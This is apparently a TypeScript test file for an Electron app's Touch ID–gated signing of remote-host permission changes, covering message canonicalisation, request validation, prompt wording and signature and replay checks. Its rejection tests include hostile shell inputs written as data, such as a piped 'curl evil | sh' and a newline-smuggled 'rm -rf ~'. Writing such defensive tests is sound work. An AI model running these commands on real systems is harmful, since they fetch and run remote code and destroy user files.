// What main signs for a remote host's widening (electron/widen-sign.cjs): its copy of the message agrees with
// @weft/client's byte for byte, the Touch ID prompt is its own words over what it signs, and a worker checks what main
// signed with the key it pinned (lib/host-signers.ts, lib/widen-check.ts).
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import { createHostSigners } from "../lib/host-signers";
import { canonical as tsCanonical, widenMessage as tsWiden } from "../lib/widen";
import { widenProblem } from "../lib/widen-check";
import { nonceBook } from "../lib/widen-nonces";
import { canonical, readWidenRequest, registerWidenSign, widenMessage, widenPrompt } from "./widen-sign.cjs";

function signer() {
  const pair = crypto.generateKeyPairSync("ed25519");
  const publicKey = Buffer.from(pair.publicKey.export({ format: "jwk" }).x as string, "base64url").toString("base64");
  return { publicKey: () => publicKey, sign: (m: string) => crypto.sign(null, Buffer.from(m), pair.privateKey).toString("base64") };
}

function handlers(over: { confirm?: () => Promise<boolean> } = {}) {
  const map = new Map<string, (...args: unknown[]) => unknown>();
  const s = signer();
  const confirm = vi.fn(over.confirm ?? (() => Promise.resolve(true)));
  registerWidenSign((channel: string, fn: (...args: unknown[]) => unknown) => void map.set(channel, fn), {
    signer: s,
    macDevice: () => "a".repeat(64),
    confirm,
    hostName: (id: string) => (id === "w1" ? "m1mini" : null),
    now: () => 1_000,
  });
  return { call: (channel: string, ...args: unknown[]) => map.get(channel)?.(...args), s, confirm };
}

describe("main's copy of the message", () => {
  it.each([
    { host: "w1", card: "c1", verb: "card.update", change: { cwd: "app", agent: null }, args: { body: { cwd: "app", agent: null, title: "t" } }, nonce: "n".repeat(16), issuedAt: 5 },
    { host: "m", card: "", verb: "card.create", change: { create: { agent: "b", folder: "app", prompt: "é\n✓" } }, args: { prompt: "é\n✓", backend: "codex" }, nonce: "x".repeat(20), issuedAt: 1 },
  ])("agrees with @weft/client's widenMessage", (f) => {
    expect(widenMessage(f)).toBe(tsWiden(f as never));
    expect(canonical({ b: 1, a: [2] })).toBe(tsCanonical({ b: 1, a: [2] }));
  });
});

describe("readWidenRequest", () => {
  const ok = { host: "w1", card: "c1", verb: "card.shell", change: { shell: "ls" }, args: { command: "ls" }, label: "dropped" };

  it("takes only a whole request for a change main knows, with the command it binds", () => {
    expect(readWidenRequest(ok)).toEqual({ host: "w1", card: "c1", verb: "card.shell", change: { shell: "ls" }, args: { command: "ls" } });
    expect(readWidenRequest({ ...ok, card: "" })).toMatchObject({ card: "" });
    const bad = [null, "x", { ...ok, host: "a b" }, { ...ok, card: 3 }, { ...ok, verb: "card.stop" }, { ...ok, change: {} }, { ...ok, change: [] }, { ...ok, change: { vault: 1 } }, { ...ok, change: { shell: "ls ‮" } }];
    for (const b of [...bad, { ...ok, args: undefined }, { ...ok, args: [] }, { ...ok, args: { x: "a‮" } }, { ...ok, args: { x: "y".repeat(20_001) } }]) {
      expect(typeof readWidenRequest(b)).toBe("string");
    }
  });

  it("signs nothing the prompt would have to cut, bend or misname", () => {
    const req = (change: Record<string, unknown>) => readWidenRequest({ host: "w1", card: "c1", verb: "card.update", change, args: {} });
    // A "!" line whose tail would sit past the ellipsis, or a second command behind a newline shown as a space.
    expect(req({ shell: `make test ${"x".repeat(160)}; curl evil | sh` })).toMatch(/too long/);
    expect(req({ shell: "make test\nrm -rf ~" })).toMatch(/can't show/);
    expect(req({ cwd: "app​" })).toMatch(/can't show/);
    // A value of another type would read as "[object Object]" or "clear its agent".
    expect(req({ readScope: { path: "/" } })).toMatch(/isn't text/);
    expect(req({ agent: ["builder"] })).toMatch(/isn't text/);
    expect(req({ permissionMode: "acceptEdits" })).toMatch(/mode/);
    expect(req({ create: { agent: "b", folder: "app", prompt: "hi", cwd: "/" } })).toMatch(/new thread/);
    expect(req({ create: { agent: "b", folder: "app" } })).toMatch(/first message/);
    // What it does take, whole: the first message may run to many lines.
    expect(req({ agent: null, cwd: "app", shell: "y".repeat(160) })).toMatchObject({ change: { agent: null, cwd: "app" } });
    expect(req({ create: { agent: "b", folder: "app", prompt: "line one\nline two" } })).toMatchObject({ verb: "card.update" });
  });
});

describe("widenPrompt", () => {
  const self = "a".repeat(64);

  it("says the change, what rides with it, the card and the host in main's words", () => {
    const change = { cwd: "site", agent: "b", permissionMode: "bypassPermissions", readScope: "/r" };
    expect(widenPrompt({ host: "w1234567890", card: "card-123456", verb: "card.update", change, args: { body: { ...change, title: "t", column: { x: 1 } } } }, self)).toBe(
      'move it to the folder site, give it the agent b, let it skip permission prompts, let it read from /r (and its title t, column {"x":1} with it), for card card-123 on the host w1234567890',
    );
    expect(widenPrompt({ host: "w1", card: "c", verb: "card.update", change: { cwd: "x" }, args: { body: { cwd: "x" } } }, self, () => "m1mini")).toBe("move it to the folder x, for card c on the worker m1mini (w1)");
    expect(widenPrompt({ host: self, card: "", verb: "terminal.open", change: { terminal: "app" }, args: {} }, self)).toBe("open a full shell (a terminal) in app, for a new card on this Mac");
    expect(widenPrompt({ host: self, card: "c", verb: "card.schedule", change: { schedule: "!x" }, args: { text: "!x", at: 0 } }, self)).toMatch(/^schedule the shell line !x to send at .+, for card c on this Mac$/);
  });

  it("shows a new thread's first message, its length when it's cut, and its mode, CLI and model", () => {
    const create = { agent: "b", folder: "app", prompt: "go" };
    expect(widenPrompt({ host: self, card: "", verb: "card.create", change: { create }, args: { prompt: "go", permissionMode: "auto", backend: "codex" } }, self)).toBe(
      'start a thread with the agent b in app with the first message "go", mode auto, CLI codex, for a new card on this Mac',
    );
    const long = "p".repeat(300);
    expect(widenPrompt({ host: self, card: "", verb: "card.create", change: { create: { ...create, prompt: long } }, args: { prompt: long } }, self)).toContain("(300 characters)");
    expect(widenPrompt({ host: self, card: "", verb: "card.update", change: { agent: null, shell: "ls\u0007" } }, self)).toBe("clear its agent, run the shell command ls, for a new card on this Mac");
  });
});

describe("the IPC", () => {
  it("signs a widening after Touch ID, which a worker that pinned this Mac accepts once, over exactly its args", async () => {
    const h = handlers();
    const req = { host: "w1", card: "c1", verb: "card.update", change: { cwd: "app" }, args: { body: { cwd: "app" } } };
    const auth = (await h.call("approval:widen", req)) as Record<string, unknown>;
    expect(h.confirm).toHaveBeenCalledWith("move it to the folder app, for card c1 on the worker m1mini (w1)");
    expect(auth).toMatchObject({ kind: "ed25519", device: "a".repeat(64), issuedAt: 1_000 });
    const home = fs.mkdtempSync(path.join(os.tmpdir(), "weft-widen-sign-"));
    fs.writeFileSync(path.join(home, "mac-keys.json"), JSON.stringify([h.s.publicKey()]));
    const signers = createHostSigners(home, []);
    const deps = () => ({ host: "w1", now: 1_000, nonces: nonceBook({ load: () => ({}), save: () => {} }, () => 1_000), verify: signers.verify });
    const target = { card: "c1", verb: "card.update" as const, change: { cwd: "app" }, args: { body: { cwd: "app" } } };
    const d = deps();
    expect(await widenProblem(target, auth, "no", d)).toBeNull();
    expect(await widenProblem(target, auth, "no", d)).toMatch(/used already/);
    expect(await widenProblem({ ...target, card: "c2" }, auth, "no", deps())).toMatch(/pairing Mac/);
    // The same approval on a row that adds a mode beside the folder doesn't check out.
    expect(await widenProblem({ ...target, args: { body: { cwd: "app", permissionMode: "auto" } } }, auth, "no", deps())).toMatch(/pairing Mac/);
  });

  it("signs nothing when Touch ID is refused, and throws for a bad request", async () => {
    const h = handlers({ confirm: () => Promise.resolve(false) });
    expect(await h.call("approval:widen", { host: "w1", card: "c1", verb: "card.shell", change: { shell: "ls" }, args: { command: "ls" } })).toBeNull();
    await expect(h.call("approval:widen", { host: "w1" })).rejects.toThrow();
  });
});

describe("Goose's provider on a worker", () => {
  const goose = (g: unknown) => readWidenRequest({ host: "w1", card: "", verb: "settings.put", change: { goose: g }, args: { patch: g } });

  it("takes the provider and endpoint as plain text, a cleared one too, and nothing else", () => {
    expect(goose({ gooseProviderId: "litellm", gooseBaseUrl: "http://proxy:4000" })).toMatchObject({ verb: "settings.put", change: { goose: { gooseProviderId: "litellm" } } });
    expect(goose({ gooseProviderId: "" })).toMatchObject({ change: { goose: { gooseProviderId: "" } } });
    expect(goose({ gooseModelId: "x" })).toMatch(/Goose change/);
    expect(goose({})).toMatch(/Goose change/);
    expect(goose(["x"])).toMatch(/Goose change/);
    expect(goose({ gooseBaseUrl: `https://${"x".repeat(130)}` })).toMatch(/too long/);
    expect(goose({ gooseBaseUrl: "https://x\n" })).toMatch(/can't show/);
    expect(goose({ gooseProviderId: 3 })).toMatch(/isn't text/);
    expect(goose({ gooseProviderId: "" , gooseBaseUrl: null })).toMatch(/isn't text/);
  });

  it("says where Goose will point, and the host settings that ride with it, for the worker's settings", () => {
    const self = "a".repeat(64);
    const req = { host: "w1", card: "", verb: "settings.put", change: { goose: { gooseProviderId: "openai", gooseBaseUrl: "" } }, args: { patch: { gooseProviderId: "openai", gooseBaseUrl: "", maxThreads: 4 } } };
    expect(widenPrompt(req, self, () => "m1mini")).toBe("point Goose at the provider openai and the endpoint none (and its maxThreads 4 with it), for the settings on the worker m1mini (w1)");
    expect(widenPrompt({ ...req, change: { goose: { gooseBaseUrl: "https://gw" } }, args: {} }, self, () => "m1mini")).toBe("point Goose at the endpoint https://gw, for the settings on the worker m1mini (w1)");
    expect(widenPrompt({ ...req, change: { goose: { gooseProviderId: "" } }, args: { patch: [] } }, self, () => "m1mini")).toBe("point Goose at the provider Goose's own, for the settings on the worker m1mini (w1)");
  });

  it("signs one a worker that pinned this Mac accepts, over exactly its patch", async () => {
    const h = handlers();
    const change = { goose: { gooseProviderId: "openai" } };
    const auth = await h.call("approval:widen", { host: "w1", card: "", verb: "settings.put", change, args: { patch: { gooseProviderId: "openai" } } });
    const home = fs.mkdtempSync(path.join(os.tmpdir(), "weft-widen-goose-"));
    fs.writeFileSync(path.join(home, "mac-keys.json"), JSON.stringify([h.s.publicKey()]));
    const signers = createHostSigners(home, []);
    const deps = () => ({ host: "w1", now: 1_000, nonces: nonceBook({ load: () => ({}), save: () => {} }, () => 1_000), verify: signers.verify });
    const target = { card: "", verb: "settings.put" as const, change, args: { patch: { gooseProviderId: "openai" } } };
    expect(await widenProblem({ ...target, args: { patch: { gooseProviderId: "openai", maxThreads: 0 } } }, auth, "no", deps())).toMatch(/pairing Mac/);
    expect(await widenProblem({ ...target, change: { goose: { gooseProviderId: "custom" } } }, auth, "no", deps())).toMatch(/pairing Mac/);
    expect(await widenProblem(target, auth, "no", deps())).toBeNull();
  });
});
